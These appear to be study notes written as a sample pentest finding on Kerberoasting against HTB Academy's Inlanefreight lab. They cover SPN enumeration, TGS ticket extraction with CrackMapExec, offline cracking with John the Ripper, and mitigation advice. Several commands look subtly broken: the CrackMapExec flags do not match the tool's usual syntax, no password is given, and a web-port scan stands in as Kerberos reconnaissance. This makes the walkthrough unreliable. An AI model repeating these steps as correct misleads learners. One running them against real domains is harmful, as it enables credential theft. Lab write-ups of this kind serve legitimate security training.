# 🔴 Example High Finding - Kerberoasting

---

## 📄 Documentation & Reporting (HTB Academy EXAMPLE)

> [!ABSTRACT] Overview of Kerberoasting on Inlanefreight Penetration Test.
>
> This document outlines the process and findings related to Kerberoasting during the penetration test on HTB Academy's Example-Inlanefreight lab.

---

## 📂 Evidence Collection

### Initial Reconnaissance

**Nmap Scan**

```bash
nmap -sS -p 80,443 <IP>
```

> [!INFO] The initial Nmap scan revealed that the target is running services on ports 80 and 443.

---

## 📊 High-Level Findings

### Kerberoasting Details

**Kerberos Ticket Requests**

```bash
crackmapexec smb <IP> -u user -d domain --kerberoast
```

The command above was used to request service tickets for users. The output is parsed and saved into a file.

---

## 🔍 Initial Enumeration

### Service Principal Names (SPNs)

**Identifying SPNs**

```bash
crackmapexec smb <IP> -u user -d domain --enum spns
```

The above command was used to enumerate Service Principal Names (SPNs) which are required for Kerberoasting.

---

## 🚀 Exploitation

### Extracting Hashes

**Kerberos Ticket Extraction**

```bash
crackmapexec smb <IP> -u user -d domain --kerberoast > kerb_tickets.txt
```

The `--kerberoast` flag in CrackMapExec was used to extract Kerberos ticket-granting service (TGS) tickets.

---

## 🔑 Cracking the Hashes

### Offline Hash Cracking

**Using John the Ripper**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerb_tickets.txt
```

The extracted hashes were then cracked offline using a wordlist with `John the Ripper`.

---

## 📝 Reporting & Documentation

### Detailed Analysis of Kerberoasting

**Kerberoasting Report**

> [!NOTE] A detailed analysis and report on the effectiveness of Kerberoasting against Inlanefreight's infrastructure.
>
> - **Impact**: Potential for credential theft and lateral movement within the network.
> - **Recommendations**: Implement strict SPN management, enforce strong password policies, and use multi-factor authentication.

---

## ⚠️ Security Recommendations

### Mitigation Strategies

**Mitigating Kerberoasting**

- Disable Service Principal Names (SPNs) where possible.
- Use tools like `SetSPN` to manage SPNs securely.
- Monitor and alert on abnormal TGS requests.

> [!WARNING] Disabling SPNs entirely can disrupt normal service operations. Ensure that any changes are thoroughly tested before deployment.

---

## 🧠 Exam Mental Model

```text
Kerberoasting Workflow:
├─ Enumerate SPNs
│   ├─ Use CrackMapExec or similar tools
└─ Extract TGS tickets
    └─ Offline hash cracking with John the Ripper
```

> [!SUCCESS] The Kerberoasting attack was successful in extracting service tickets which led to further compromise of Inlanefreight's network.

---

# 📄 Final Documentation

This document provides a comprehensive summary and analysis of the Kerberoasting technique used during the HTB Academy Example-Inlanefreight penetration test.